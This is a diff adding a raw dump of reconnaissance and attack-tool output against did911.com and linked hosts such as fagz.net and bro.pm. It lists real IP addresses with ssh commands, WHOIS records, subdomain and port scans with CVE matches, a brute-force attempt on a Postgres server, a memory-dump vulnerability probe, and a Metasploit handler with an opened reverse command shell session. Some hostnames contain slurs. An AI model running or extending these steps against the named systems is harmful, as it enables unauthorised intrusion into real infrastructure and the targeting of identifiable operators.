@@ -1,0 +1,1487 @@
+ssh 22 root@149.56.12.202
+ssh 22 root@139.99.157.254
+ssh 158.69.197.147:1488
+Registrars.
+Domain name: did911.com
+Registry Domain ID: 1999769617_DOMAIN_COM-VRSN
+Registrar WHOIS Server: whois.namecheap.com
+Registrar URL: http://www.namecheap.com
+Updated Date: 2019-02-22T02:54:23.58Z
+Creation Date: 2016-02-03T05:39:15.00Z
+Registrar Registration Expiration Date: 2020-02-03T05:39:15.00Z
+Registrar: NAMECHEAP INC
+Registrar IANA ID: 1068
+Registrar Abuse Contact Email: abuse@namecheap.com
+Registrar Abuse Contact Phone: +1.6613102107
+Reseller: NAMECHEAP INC
+Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
+Registry Registrant ID:
+Registrant Name: WhoisGuard Protected
+Registrant Organization: WhoisGuard, Inc.
+Registrant Street: P.O. Box 0823-03411
+Registrant City: Panama
+Registrant State/Province: Panama
+Registrant Postal Code:
+Registrant Country: PA
+Registrant Phone: +507.8365503
+Registrant Phone Ext:
+Registrant Fax: +51.17057182
+Registrant Fax Ext:
+Registrant Email: a45069d8d64d4d54ab352435bbf0d360.protect@whoisguard.com
+Registry Admin ID:
+Admin Name: WhoisGuard Protected
+Admin Organization: WhoisGuard, Inc.
+Admin Street: P.O. Box 0823-03411
+Admin City: Panama
+Admin State/Province: Panama
+Admin Postal Code:
+Admin Country: PA
+Admin Phone: +507.8365503
+Admin Phone Ext:
+Admin Fax: +51.17057182
+Admin Fax Ext:
+Admin Email: a45069d8d64d4d54ab352435bbf0d360.protect@whoisguard.com
+Registry Tech ID:
+Tech Name: WhoisGuard Protected
+Tech Organization: WhoisGuard, Inc.
+Tech Street: P.O. Box 0823-03411
+Tech City: Panama
+Tech State/Province: Panama
+Tech Postal Code:
+Tech Country: PA
+Tech Phone: +507.8365503
+Tech Phone Ext:
+Tech Fax: +51.17057182
+Tech Fax Ext:
+Tech Email: a45069d8d64d4d54ab352435bbf0d360.protect@whoisguard.com
+Name Server: edna.ns.cloudflare.com
+Name Server: max.ns.cloudflare.com
+[+] IP Address : 139.180.221.194
+[+] Country : Singapore
+[+] State :
+[+] City : Singapore
+[+] Latitude : 1.2995999999999999
+[+] Longitude : 103.8549
+139.180.221.194    139.180.221.194.vultr.com.    nameserver = rns2.choopadns.com.    nameserver = rns1.choopadns.com.
+resource (listener.rc)> set LHOST did911.com
+LHOST => did911.com
+resource (listener.rc)> set LPORT 80
+LPORT => 80
+resource (listener.rc)> exploit
+[-] Handler bind to 139.180.221.194:80:-  -
+[*] Started reverse TCP handler on 0.0.0.0:80
+Command shell session 1 opened (127.0.0.1:80 -> 139.180.221.194:43998) at 2019-10-31 17:25:55 -0400
+└──╼   Help:
+    http://irc.did911.com/eto2rgee
+  SIPOptions:
+    http://irc.did911.com/ob4vp9xs
+
+  users: 65
+  servers: 2
+  ops: 2
+  chans: 35
+  lusers: 48
+  lservers: 1
+  server: eyerc.did911.com
+  version: UnrealIRCd-4.0.11. eyerc.did911.com
+  source ident: nmap
+  source host: F5F9136D.EA7C0A18.F7A80ED1.IP
+  error: Closing Link: nxndjpxbi[37.120.204.10] (Quit: nxndjpxbi)
+
+  nginx/1.12.2
+
+  cpe:/a:openbsd:openssh:7.4:
+	CVE-2018-15919		5.0		https://vulners.com/cve/CVE-2018-15919
+	CVE-2017-15906		5.0		https://vulners.com/cve/CVE-2017-15906
+
+      2048 66:5b:67:f1:99:4e:18:ec:a3:b5:ed:bb:4f:8d:c2:1f (RSA)
+      256 fe:b7:b7:e4:17:82:5a:f6:e7:92:0d:ea:dc:78:53:8d (ECDSA)
+      256 13:78:66:b5:67:79:ad:9c:4d:57:56:4b:67:71:12:7d (ED25519)
+
+      anji.did911.com
+
+  2048 44:95:f7:99:39:05:0b:7a:20:1d:e1:8c:2f:b7:54:78 (RSA)
+  256 5b:60:9a:66:f7:c5:40:21:36:1f:bb:a6:f1:a9:a4:96 (ECDSA)
+  256 7a:26:b0:16:36:1f:50:57:fe:39:b3:ec:69:a7:fa:37 (ED25519)
+
+ [+] Site :> 139.180.221.194
+ [+] Site :> did911.com
+ rDNS record for 139.180.221.194: 139.180.221.194.vultr.com
+ 139.180.221.194:22    - SSH server version: SSH-2.0-OpenSSH_7.4 ( service.version=7.4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.4 service.protocol=ssh fingerprint_db=ssh.banner )
+ RHOSTS => irc.did911.com
+ WAIT => 2
+ [+] 149.56.12.202:22      - SSH server version: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+[*] anji.did911.com:22    - Scanned 1 of 1 hosts (100% complete)
+[DATA] attacking postgres://149.56.12.202:5432/
+[521] http://agaschamber.did911.com/  (Generic)
+
+ [+] Target may be vulnerable...
+ [+] Stand by...
+ [-] Memory dump start position not found, dumping all data instead
+
+ [+] Memory contents:
+ 48 54 54 50 2f 31 2e 31 20 34 30 30 20 42 61 64    |HTTP/1.1 400 Bad|
+ 20 52 65 71 75 65 73 74 0d 0a 53 65 72 76 65 72    | Request..Server|
+ 3a 20 6e 67 69 6e 78 2f 31 2e 31 32 2e 32 0d 0a    |: nginx/1.12.2..|
+ 44 61 74 65 3a 20 54 68 75 2c 20 33 31 20 4f 63    |Date: Thu, 31 Oc|
+ 74 20 32 30 31 39 20 32 30 3a 34 35 3a 32 39 20    |t 2019 20:45:29 |
+ 47 4d 54 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70    |GMT..Content-Typ|
+ 65 3a 20 74 65 78 74 2f 68 74 6d 6c 3b 20 63 68    |e: text/html; ch|
+ 61 72 73 65 74 3d 75 74 66 2d 38 0d 0a 43 6f 6e    |arset=utf-8..Con|
+ 74 65 6e 74 2d 4c 65 6e 67 74 68 3a 20 31 37 33    |tent-Length: 173|
+ 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 63 6c    |..Connection: cl|
+ 6f 73 65 0d 0a 0d 0a 3c 68 74 6d 6c 3e 0d 0a 3c    |ose....<html>..<|
+ 68 65 61 64 3e 3c 74 69 74 6c 65 3e 34 30 30 20    |head><title>400 |
+ 42 61 64 20 52 65 71 75 65 73 74 3c 2f 74 69 74    |Bad Request</tit|
+ 6c 65 3e 3c 2f 68 65 61 64 3e 0d 0a 3c 62 6f 64    |le></head>..<bod|
+ 79 20 62 67 63 6f 6c 6f 72 3d 22 77 68 69 74 65    |y bgcolor="white|
+ 22 3e 0d 0a 3c 63 65 6e 74 65 72 3e 3c 68 31 3e    |">..<center><h1>|
+ 34 30 30 20 42 61 64 20 52 65 71 75 65 73 74 3c    |400 Bad Request<|
+ 2f 68 31 3e 3c 2f 63 65 6e 74 65 72 3e 0d 0a 3c    |/h1></center>..<|
+ 68 72 3e 3c 63 65 6e 74 65 72 3e 6e 67 69 6e 78    |hr><center>nginx|
+ 2f 31 2e 31 32 2e 32 3c 2f 63 65 6e 74 65 72 3e    |/1.12.2</center>|
+ 0d 0a 3c 2f 62 6f 64 79 3e 0d 0a 3c 2f 68 74 6d    |..</body>..</htm|
+ 6c 3e 0d 0a                                        |l>..|
+
+   FourOhFourRequest:
+     HTTP/1.0 404 Not Found
+     Date: Fri, 01 Nov 2019 01:07:59 GMT
+     Server: ZNC 1.7.2+deb3 - https://znc.in
+     Content-Length: 376
+     Content-Type: text/html; charset=utf-8
+     Set-Cookie: 14572-SessionId=bdc62fe1b367ce1e5c579eb98e52e693b753ceebe77c7f11406c41a475795c2c; HttpOnly; path=/;Secure; SameSite=Strict;
+     Connection: Close
+     <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE html>
+     <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+     <head>
+     <meta charset="UTF-8"/>
+     <title>404 Not Found</title>
+     </head>
+     <body>
+     <h1>Not Found</h1>
+     <p>The requested URL was not found on this server.</p>
+     <hr/>
+     <p>ZNC 1.7.2+deb3 - <a href="https://znc.in">https://znc.in</a></p>
+     </body>
+     </html>
+   GetRequest:
+     HTTP/1.0 200 OK
+     Date: Fri, 01 Nov 2019 01:06:58 GMT
+     Server: ZNC 1.7.2+deb3 - https://znc.in
+     Content-Length: 2504
+     Content-Type: text/html; charset=utf-8
+     Set-Cookie: 14572-SessionId=888de9d8f01ec4e2ca522316183e92c21043284449e7a02f0aad9dc9b2011516; HttpOnly; path=/;Secure; SameSite=Strict;
+     Connection: Close
+     <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE html>
+     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+     <head>
+     <meta charset="UTF-8" />
+     <title>ZNC - Web Frontend</title>
+     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+     <link rel="stylesheet" type="text/css" href="/pub/_default_.css" />
+     <link rel="stylesheet" type="text/css" href="/skinfiles/_default_/global.css" />
+     <link rel="stylesheet" type="text/css" href="/pub/jquery-ui-sortable.1.11.4.min.css" />
+     <link rel="stylesheet" type="text/css" href="/pub/selectize-0.12.1.css" />
+ PORT     STATE    SERVICE
+ 21/tcp   filtered ftp
+ 22/tcp   filtered ssh
+ 23/tcp   filtered telnet
+ 80/tcp   filtered http
+ 110/tcp  filtered pop3
+ 143/tcp  filtered imap
+ 443/tcp  filtered https
+ 3389/tcp filtered ms-wbt-server
+
+149.56.12.202 - aliases.did911.com
+"aliases.did911.com": {
+       "ip": "149.56.12.202",
+       "ports": [],
+       "schema": "http",
+       "cms": null,
+       "forms": [],
+       "all_urls": [
+           "http://aliases.did911.com"
+       ],
+       "technologies": [],
+       "outdated_libs": []
+   }
+}
+
+149.56.12.202 - farming.did911.com
+"farming.did911.com": {
+     "ip": "149.56.12.202",
+     "ports": [
+         22
+     ],
+     "schema": "http",
+     "cms": null,
+     "forms": [],
+     "all_urls": [
+         "http://farming.did911.com"
+     ],
+     "technologies": [],
+     "outdated_libs": []
+ }
+}
+
+139.180.221.194 - did911.com
+142.44.163.110 - irc.did911.com
+"irc.did911.com": {
+       "ip": "142.44.163.110",
+       "ports": [
+           80,
+           22
+       ],
+       "schema": "http",
+       "cms": null,
+       "forms": [
+           {}
+       ],
+       "all_urls": [
+           "http://irc.did911.com"
+       ],
+       "technologies": [],
+       "outdated_libs": []
+   }
+}
+
+comments.did911.com
+"comments.did911.com": {
+     "ip": "158.69.197.147",
+     "ports": [
+         80,
+         111,
+         6666,
+         6669
+     ],
+     "schema": "http",
+     "cms": null,
+     "forms": [
+         {}
+     ],
+     "all_urls": [
+         "http://comments.did911.com"
+     ],
+     "technologies": [
+         "Debian"
+     ],
+     "outdated_libs": []
+ }
+}
+
+*.did911.com
+patreon.did911.com
+"patreon.did911.com": {
+      "ip": "158.69.197.147",
+      "ports": [
+          80,
+          111
+      ],
+      "schema": "http",
+      "cms": null,
+      "forms": [
+          {}
+      ],
+      "all_urls": [
+          "http://patreon.did911.com"
+      ],
+      "technologies": [
+          "Debian"
+      ],
+      "outdated_libs": []
+  }
+}
+
+2009/04/30   http://www.did911.com:80/  (https://web.archive.org/web/20090430155048/http://www.did911.com:80/)
+2009/04/30   http://www.jews.did911.com:80/  (https://web.archive.org/web/20090430155053/http://www.jews.did911.com:80/)
+2009/05/02   http://www.did911.com:80/?C=D;O=A  (https://web.archive.org/web/20090502122310/http://www.did911.com:80/?C=D;O=A)
+2009/05/02   http://www.did911.com:80/?C=M;O=A  (https://web.archive.org/web/20090502122315/http://www.did911.com:80/?C=M;O=A)
+2009/05/02   http://www.did911.com:80/?C=N;O=D  (https://web.archive.org/web/20090502122320/http://www.did911.com:80/?C=N;O=D)
+2009/05/02   http://www.did911.com:80/?C=S;O=A  (https://web.archive.org/web/20090502122325/http://www.did911.com:80/?C=S;O=A)
+2009/05/02   http://www.jews.did911.com:80/?C=D;O=A  (https://web.archive.org/web/20090502122330/http://www.jews.did911.com:80/?C=D;O=A)
+2009/05/02   http://www.jews.did911.com:80/?C=M;O=A  (https://web.archive.org/web/20090502122335/http://www.jews.did911.com:80/?C=M;O=A)
+2009/05/02   http://www.jews.did911.com:80/?C=N;O=D  (https://web.archive.org/web/20090502122340/http://www.jews.did911.com:80/?C=N;O=D)
+2009/05/02   http://www.jews.did911.com:80/?C=S;O=A  (https://web.archive.org/web/20090502122406/http://www.jews.did911.com:80/?C=S;O=A)
+2009/05/31   http://ataturk.did911.com:80/multis.htm  (https://web.archive.org/web/20090531182047/http://ataturk.did911.com:80/multis.htm)
+2009/05/31   http://ataturk.did911.com:80/mutlis.htm  (https://web.archive.org/web/20090531182151/http://ataturk.did911.com:80/mutlis.htm)
+2009/06/02   http://www.ataturk.did911.com:80/greece  (https://web.archive.org/web/20090602123815/http://www.ataturk.did911.com:80/greece)
+2009/06/02   http://www.ataturk.did911.com:80/greece/  (https://web.archive.org/web/20090602123815/http://www.ataturk.did911.com:80/greece/)
+2009/06/02   http://www.ataturk.did911.com:80/greece/rwar.htm  (https://web.archive.org/web/20090602132935/http://www.ataturk.did911.com:80/greece/rwar.htm)
+2009/06/02   http://www.ataturk.did911.com:80/greece/skopje.htm  (https://web.archive.org/web/20090602132959/http://www.ataturk.did911.com:80/greece/skopje.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/access.htm  (https://web.archive.org/web/20090603211119/http://www.ataturk.did911.com:80/greece/access.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/alliances.htm  (https://web.archive.org/web/20090603211124/http://www.ataturk.did911.com:80/greece/alliances.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/constitution.htm  (https://web.archive.org/web/20090603211136/http://www.ataturk.did911.com:80/greece/constitution.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/inactivity.htm  (https://web.archive.org/web/20090603211143/http://www.ataturk.did911.com:80/greece/inactivity.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/index_files/robots.htm  (https://web.archive.org/web/20090603211204/http://www.ataturk.did911.com:80/greece/index_files/robots.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/multis.htm  (https://web.archive.org/web/20090603211242/http://www.ataturk.did911.com:80/greece/multis.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/paranoia.htm  (https://web.archive.org/web/20090603211340/http://www.ataturk.did911.com:80/greece/paranoia.htm)
+2009/06/03   http://www.ataturk.did911.com:80/greece/rwar_files/robots.htm  (https://web.archive.org/web/20090603232145/http://www.ataturk.did911.com:80/greece/rwar_files/robots.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/index_files/ads(1).htm  (https://web.archive.org/web/20090604014839/http://www.ataturk.did911.com:80/greece/index_files/ads(1).htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/index_files/index.htm  (https://web.archive.org/web/20090604014844/http://www.ataturk.did911.com:80/greece/index_files/index.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/index_files/saved_resource  (https://web.archive.org/web/20090604014855/http://www.ataturk.did911.com:80/greece/index_files/saved_resource)
+2009/06/04   http://www.ataturk.did911.com:80/greece/index_files/saved_resource(2)  (https://web.archive.org/web/20090604014935/http://www.ataturk.did911.com:80/greece/index_files/saved_resource(2))
+2009/06/04   http://www.ataturk.did911.com:80/greece/index_files/ads.htm  (https://web.archive.org/web/20090604015022/http://www.ataturk.did911.com:80/greece/index_files/ads.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/index_files/saved_resource(1)  (https://web.archive.org/web/20090604015037/http://www.ataturk.did911.com:80/greece/index_files/saved_resource(1))
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/robots.htm  (https://web.archive.org/web/20090604015042/http://www.ataturk.did911.com:80/greece/skopje_files/robots.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/rwar_files/rwar.htm  (https://web.archive.org/web/20090604055719/http://www.ataturk.did911.com:80/greece/rwar_files/rwar.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/rwar_files/saved_resource  (https://web.archive.org/web/20090604055723/http://www.ataturk.did911.com:80/greece/rwar_files/saved_resource)
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/saved_resource(1)  (https://web.archive.org/web/20090604055747/http://www.ataturk.did911.com:80/greece/skopje_files/saved_resource(1))
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/skopje.htm  (https://web.archive.org/web/20090604055835/http://www.ataturk.did911.com:80/greece/skopje_files/skopje.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/  (https://web.archive.org/web/20090604070904/http://www.ataturk.did911.com:80/greece/)
+2009/06/04   http://www.ataturk.did911.com:80/greece/rwar_files/ads.htm  (https://web.archive.org/web/20090604101655/http://www.ataturk.did911.com:80/greece/rwar_files/ads.htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/rwar_files/saved_resource(2)  (https://web.archive.org/web/20090604101658/http://www.ataturk.did911.com:80/greece/rwar_files/saved_resource(2))
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/saved_resource  (https://web.archive.org/web/20090604101703/http://www.ataturk.did911.com:80/greece/skopje_files/saved_resource)
+2009/06/04   http://www.ataturk.did911.com:80/greece/rwar_files/ads(1).htm  (https://web.archive.org/web/20090604102251/http://www.ataturk.did911.com:80/greece/rwar_files/ads(1).htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/rwar_files/saved_resource(1)  (https://web.archive.org/web/20090604102315/http://www.ataturk.did911.com:80/greece/rwar_files/saved_resource(1))
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/ads(1).htm  (https://web.archive.org/web/20090604102324/http://www.ataturk.did911.com:80/greece/skopje_files/ads(1).htm)
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/saved_resource(2)  (https://web.archive.org/web/20090604102338/http://www.ataturk.did911.com:80/greece/skopje_files/saved_resource(2))
+2009/06/04   http://www.ataturk.did911.com:80/greece/skopje_files/ads.htm  (https://web.archive.org/web/20090604103843/http://www.ataturk.did911.com:80/greece/skopje_files/ads.htm)
+2011/07/07   http://did911.com/robots.txt  (https://web.archive.org/web/20110707195310/http://did911.com/robots.txt)
+2011/07/07   http://www.did911.com/robots.txt  (https://web.archive.org/web/20110707195310/http://www.did911.com/robots.txt)
+2014/01/07   http://did911.com/robots.txt  (https://web.archive.org/web/20140107172653/http://did911.com/robots.txt)
+2014/01/07   http://did911.com/  (https://web.archive.org/web/20140107172657/http://did911.com/)
+2014/05/17   http://did911.com/robots.txt  (https://web.archive.org/web/20140517072826/http://did911.com/robots.txt)
+2014/05/17   http://did911.com/  (https://web.archive.org/web/20140517072829/http://did911.com/)
+2014/05/18   http://did911.com/robots.txt  (https://web.archive.org/web/20140518231220/http://did911.com/robots.txt)
+2014/05/18   http://did911.com/favicon.ico  (https://web.archive.org/web/20140518231223/http://did911.com/favicon.ico)
+2014/05/18   http://did911.com/robots.txt  (https://web.archive.org/web/20140518232709/http://did911.com/robots.txt)
+2014/05/18   http://did911.com/css/style.css  (https://web.archive.org/web/20140518232712/http://did911.com/css/style.css)
+2014/05/18   http://did911.com/robots.txt  (https://web.archive.org/web/20140518233400/http://did911.com/robots.txt)
+2014/05/18   http://did911.com/img/logo-php.png  (https://web.archive.org/web/20140518233404/http://did911.com/img/logo-php.png)
+2014/05/18   http://did911.com/robots.txt  (https://web.archive.org/web/20140518233655/http://did911.com/robots.txt)
+2014/05/18   http://did911.com/img/favicon.ico  (https://web.archive.org/web/20140518233658/http://did911.com/img/favicon.ico)
+2014/05/18   http://did911.com/robots.txt  (https://web.archive.org/web/20140518234424/http://did911.com/robots.txt)
+2014/05/18   http://did911.com/img/speed-logo.png  (https://web.archive.org/web/20140518234428/http://did911.com/img/speed-logo.png)
+2014/05/19   http://did911.com/robots.txt  (https://web.archive.org/web/20140519001104/http://did911.com/robots.txt)
+2014/05/19   http://did911.com/js/index.js.pagespeed.jm.z3SMKNPXVW.js  (https://web.archive.org/web/20140519001108/http://did911.com/js/index.js.pagespeed.jm.z3SMKNPXVW.js)
+2014/05/19   http://did911.com/robots.txt  (https://web.archive.org/web/20140519002802/http://did911.com/robots.txt)
+2014/05/19   http://did911.com/img/nginx-logo.png  (https://web.archive.org/web/20140519002805/http://did911.com/img/nginx-logo.png)
+2014/05/24   http://did911.com/robots.txt  (https://web.archive.org/web/20140524223141/http://did911.com/robots.txt)
+2014/05/24   http://did911.com/img/background.png  (https://web.archive.org/web/20140524223144/http://did911.com/img/background.png)
+2014/12/17   http://did911.com/robots.txt  (https://web.archive.org/web/20141217101958/http://did911.com/robots.txt)
+2014/12/17   http://did911.com/  (https://web.archive.org/web/20141217102002/http://did911.com/)
+2014/12/21   http://did911.com/robots.txt  (https://web.archive.org/web/20141221044256/http://did911.com/robots.txt)
+2014/12/21   http://did911.com/favicon.ico  (https://web.archive.org/web/20141221044259/http://did911.com/favicon.ico)
+2014/12/21   http://did911.com/robots.txt  (https://web.archive.org/web/20141221045814/http://did911.com/robots.txt)
+2014/12/21   http://did911.com/js/google_caf.js?rte=1&tm=2&dn=did911.com&tid=1020  (https://web.archive.org/web/20141221045817/http://did911.com/js/google_caf.js?rte=1&tm=2&dn=did911.com&tid=1020)
+2014/12/21   http://did911.com/robots.txt  (https://web.archive.org/web/20141221063440/http://did911.com/robots.txt)
+2014/12/21   http://did911.com/css/style.css?rte=1&tm=2&dn=did911.com&tid=1020&def=Akamai%3aHostingURL%3dhttp%3a%2f%2fi.nuseek.com  (https://web.archive.org/web/20141221063443/http://did911.com/css/style.css?rte=1&tm=2&dn=did911.com&tid=1020&def=Akamai%3aHostingURL%3dhttp%3a%2f%2fi.nuseek.com)
+2014/12/21   http://did911.com/robots.txt  (https://web.archive.org/web/20141221063805/http://did911.com/robots.txt)
+2014/12/21   http://did911.com/js/standard.js?rte=1&tm=2&dn=did911.com&tid=1020  (https://web.archive.org/web/20141221063808/http://did911.com/js/standard.js?rte=1&tm=2&dn=did911.com&tid=1020)
+2016/03/10   http://did911.com/robots.txt  (https://web.archive.org/web/20160310140614/http://did911.com/robots.txt)
+2016/03/10   http://did911.com/  (https://web.archive.org/web/20160310140618/http://did911.com/)
+2016/03/31   http://did911.com/robots.txt  (https://web.archive.org/web/20160331090021/http://did911.com/robots.txt)
+2016/03/31   http://did911.com/favicon.ico  (https://web.archive.org/web/20160331090028/http://did911.com/favicon.ico)
+2016/10/03   http://did911.com/robots.txt  (https://web.archive.org/web/20161003061012/http://did911.com/robots.txt)
+2016/10/03   http://did911.com/  (https://web.archive.org/web/20161003061044/http://did911.com/)
+2016/10/21   http://did911.com/robots.txt  (https://web.archive.org/web/20161021201907/http://did911.com/robots.txt)
+2016/10/21   http://did911.com/favicon.ico  (https://web.archive.org/web/20161021201911/http://did911.com/favicon.ico)
+2018/01/04   http://did911.com/robots.txt  (https://web.archive.org/web/20180104144442/http://did911.com/robots.txt)
+2018/01/04   http://did911.com/  (https://web.archive.org/web/20180104144445/http://did911.com/)
+2018/01/04   http://did911.com/robots.txt  (https://web.archive.org/web/20180104214311/http://did911.com/robots.txt)
+2018/01/04   http://did911.com/favicon.ico  (https://web.archive.org/web/20180104214314/http://did911.com/favicon.ico)
+2018/07/03   http://did911.com/robots.txt  (https://web.archive.org/web/20180703060117/http://did911.com/robots.txt)
+2018/08/03   http://did911.com/robots.txt  (https://web.archive.org/web/20180803020327/http://did911.com/robots.txt)
+2018/08/08   http://did911.com/robots.txt  (https://web.archive.org/web/20180808170525/http://did911.com/robots.txt)
+2018/08/08   http://did911.com/  (https://web.archive.org/web/20180808170529/http://did911.com/)
+2018/08/29   http://did911.com/robots.txt  (https://web.archive.org/web/20180829001310/http://did911.com/robots.txt)
+2018/08/29   http://did911.com/favicon.ico  (https://web.archive.org/web/20180829001314/http://did911.com/favicon.ico)
+[+] Running tools for: ssh on 158.69.197.147:1488
+[+] Running tools for: irc on 158.69.197.147:6660
+[+] Running tools for: irc on 158.69.197.147:6661
+[+] Running tools for: irc on 158.69.197.147:6662
+[+] Running tools for: irc on 158.69.197.147:6663
+[+] Running tools for: irc on 158.69.197.147:6664
+[+] Running tools for: irc on 158.69.197.147:6665
+[+] Running tools for: irc on 158.69.197.147:6666
+[+] Running tools for: irc on 158.69.197.147:6667
+[+] Running tools for: irc on 158.69.197.147:6668
+[+] Running tools for: irc on 158.69.197.147:6669
+[+] Running tools for: irc on 158.69.197.147:6697
+[+] Running tools for: irc on 158.69.197.147:6900
+[+] Running tools for: irc on 158.69.197.147:7000
+[+] Running tools for: irc on 158.69.197.147:9999
+
+
+====================================================================================
+ GATHERING PROJECT SONAR SUBDOMAINS
+====================================================================================
+jews.did911.com
+Scanning 79-76-215-59.dynamic.dsl.as91o5.com (79.137.37.33) [1 port]
+"jews.did911.com": {
+       "ip": "79.137.37.33",
+       "ports": [
+           80,
+           22,
+           111,
+           6667,
+           6666
+       ],
+       "schema": "http",
+       "cms": null,
+       "forms": [
+           {}
+       ],
+       "all_urls": [
+           "http://jews.did911.com"
+       ],
+       "technologies": [
+           "Debian"
+       ],
+       "outdated_libs": []
+   }
+}
+
+mail2.did911.com
+mail.did911.com
+trump.did911.com
+"trump.did911.com": {
+       "ip": "139.99.157.254",
+       "ports": [
+           22,
+           80
+       ],
+       "schema": "http",
+       "cms": null,
+       "forms": [
+           {}
+       ],
+       "all_urls": [
+           "http://trump.did911.com"
+       ],
+       "technologies": [
+           "Debian"
+       ],
+       "outdated_libs": []
+   }
+}
+
+www.did911.com
+
+ [+] MX Records
+20 (149.56.12.202) OVHCanada  Canada
+
+ [+] MX Records
+10 (149.56.12.202) OVHCanada  Canada
+
+ [+] Host Records (A)
+did911.comSSH: (139.180.221.194.iomtt.com) (139.180.221.194) AS-CHOOPA - Choopa, LLC Singapore
+farming.did911.comSSH: (anji.did911.com) (149.56.12.202) OVHCanada  Canada 22/tcp   open     ssh
+patreon.did911.com (irc.fagz.net) (158.69.197.147) OVHCanada  Canada
+trump.did911.comSSH: (trump.did911.com) (139.99.157.254) OVHAustralia  Australia
+7000/tcp open  afs3-fileserver syn-ack ttl 45
+aliases.did911.comSSH: (anji.did911.com) (149.56.12.202) OVHCanada  Canada
+comments.did911.com (irc.fagz.net) (158.69.197.147) OVHCanada  Canada
+irc.fagz.net
+	164.132.228.206
+irc.supernets.org	OVH
+France
+dns1.stabletransit.com. 69.20.95.4 ns.rackspace.com	RACKSPACE - Rackspace Hosting United States dns2.stabletransit.com. 65.61.188.4 ns2.rackspace.com	RACKSPACE-LON United States
+
+MX Records ** This is where email for the domain goes...
+
+TXT Records ** Find more hosts in Sender Policy Framework (SPF) configurations
+
+Host Records (A) ** this data may not be current as it uses a static database (updated monthly)
+fagz.net
+mysql://67.23.0.195:3306/
+SSH: SSH-2.0-OpenSSH_5.1
+HTTP TECH: Apache,2.2.14
+HTTPS TECH: 	67.23.0.195
+mysql-info 3306/tcp
+  Protocol: 10
+  Version: 5.0.88
+  Thread ID: 388306
+  Capabilities flags: 41516
+  Some Capabilities: ConnectWithDatabase, Support41Auth, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, LongColumnFlag
+  Status: Autocommit
+  Salt: 3nR./A9:Tz,fAOJe?G(2
++ Target IP:          67.23.0.195
++ Target Hostname:    67.23.0.195
++ Target Port:        80
++ Start Time:         2019-10-31 13:25:45 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.14 (Fedora)
+67-23-0-195.static.cloud-ips.com	RMH-14 - Rackspace Hosting
+United States
+www.did911.comHTTP: (104.27.186.249) CLOUDFLARENET - Cloudflare, Inc. United States
+Address       = 139.180.221.194
+Network       = 139.180.221.194 / 32
+Netmask       = 255.255.255.255
+Broadcast     = not needed on Point-to-Point links
+Wildcard Mask = 0.0.0.0
+Hosts Bits    = 0
+Max. Hosts    = 1   (2^0 - 0)
+Host Range    = { 139.180.221.194 - 139.180.221.194 }
+[+] Received : trump.did911.com => (139.99.157.254)
+[+] Received : www.did911.com => (192.99.55.197)
+[+] Received : jews.did911.com => (79.137.37.33)
+mail2.did911.com => 54.39.104.40 OVH SAS
+irc.did911.com   => 142.44.163.110   => 	irc.bro.pm bro.pm
+banner
+server: nginx/1.12.2
+host
+irc.did911.com
+SSH: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7 	198.199.126.160
+mta-86.mailcasinox.com	DIGITALOCEAN-ASN - DigitalOcean, LLC
+Netherlands 50 fb.mail.gandi.net. 217.70.178.217 bro.pm jrtmsieef.world mta-86.sndmart.click vps.indirgani.com
+spool8.mail.gandi.net	GANDI-AS Domain name registrar - http://www.gandi.net
+France 10 spool.mail.gandi.net. 217.70.178.1 spool.mail.gandi.net	GANDI-AS Domain name registrar - http://www.gandi.net
+France
+"irc.bro.pm": {
+       "ip": "142.44.163.110",
+       "ports": [
+           22,
+           80
+       ],
+       "schema": "http",
+       "cms": null,
+       "forms": [
+           {}
+       ],
+       "all_urls": [
+           "http://irc.bro.pm"
+       ],
+       "technologies": [],
+       "outdated_libs": []
+   },
+   "www.bro.pm": {
+       "ip": "217.70.184.50",
+       "ports": [
+           80
+       ],
+       "schema": "http",
+       "cms": null,
+       "forms": [
+           {}
+       ],
+       "all_urls": [
+           "http://www.bro.pm"
+       ],
+       "technologies": [],
+       "outdated_libs": []
+   },
+   "bro.pm": {
+       "ip": "198.199.126.160",
+       "ports": [
+           22,
+           8080
+       ],
+       "schema": "http",
+       "cms": null,
+       "forms": [],
+       "all_urls": [
+           "http://bro.pm"
+       ],
+       "technologies": [],
+       "outdated_libs": []
+   }
+}
+irc.bro.pm
+[+] TXT records found
+"v=spf1 include:_mailcust.gandi.net ?all"
+
+[+] MX records found, added to target list
+50 fb.mail.gandi.net.
+10 spool.mail.gandi.net.
+
+[*] Scanning bro.pm for A records
